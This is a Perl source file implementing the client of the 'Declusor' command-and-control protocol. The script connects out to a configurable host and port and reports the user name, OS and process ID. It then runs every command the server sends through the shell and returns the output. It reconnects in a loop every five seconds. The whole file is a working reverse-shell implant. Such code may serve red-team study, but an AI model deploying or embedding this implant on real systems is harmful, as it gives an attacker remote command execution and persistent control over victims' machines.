#!/usr/bin/env perl
# -----------------------------------------------------------------------------
# Declusor Perl Client
# Implements the Declusor C2 Protocol (DCP).
# -----------------------------------------------------------------------------

use strict;
use warnings;
use IO::Socket::INET;

# Configuration
my $HOST = $ENV{'HOST'} || '127.0.0.1';
my $PORT = $ENV{'PORT'} || 4444;

# DCP Message Types
use constant {
    MSG_AUTH_HELLO => 0x01,
    MSG_AUTH_ACK   => 0x02,
    MSG_CMD_EXEC   => 0x10,
    MSG_CMD_STDOUT => 0x11,
    MSG_CMD_STDERR => 0x12,
    MSG_CMD_EXIT   => 0x13,
    MSG_HEARTBEAT  => 0x20,
    MSG_TERM       => 0x99,
};

sub send_frame {
    my ($socket, $type, $payload) = @_;
    $payload = "" unless defined $payload;
    my $length = length($payload);
    # Pack Length (4 bytes BE) and Type (1 byte)
    my $header = pack("NC", $length, $type);
    print $socket $header . $payload;
}

sub recv_frame {
    my ($socket) = @_;
    my $header;
    my $bytes_read = read($socket, $header, 5);
    return unless defined $bytes_read && $bytes_read == 5;
    
    my ($length, $type) = unpack("NC", $header);
    
    my $payload = "";
    if ($length > 0) {
        read($socket, $payload, $length);
    }
    
    return ($type, $payload);
}

while (1) {
    eval {
        my $socket = IO::Socket::INET->new(
            PeerAddr => $HOST,
            PeerPort => $PORT,
            Proto    => 'tcp'
        ) or die "Connect failed";
        
        # Handshake
        my $user = $ENV{USER} || "unknown";
        my $meta = "user=$user&os=$^O&pid=$$";
        send_frame($socket, MSG_AUTH_HELLO, $meta);
        
        # Wait for ACK
        my ($type, $payload) = recv_frame($socket);
        if (!defined $type || $type != MSG_AUTH_ACK) {
            close $socket;
            die "Handshake failed";
        }
        
        while (1) {
            my ($mtype, $mpayload) = recv_frame($socket);
            last unless defined $mtype;
            
            if ($mtype == MSG_CMD_EXEC) {
                my $cmd = $mpayload;
                
                # Execute command
                # Capture stdout and stderr
                # This is a simple implementation using backticks and redirect
                my $output = `$cmd 2>&1`;
                my $exit_code = $? >> 8;
                
                send_frame($socket, MSG_CMD_STDOUT, $output) if defined $output;
                send_frame($socket, MSG_CMD_EXIT, "$exit_code");
                
            } elsif ($mtype == MSG_HEARTBEAT) {
                send_frame($socket, MSG_HEARTBEAT);
            } elsif ($mtype == MSG_TERM) {
                last;
            }
        }
        close $socket;
    };
    sleep 5;
}
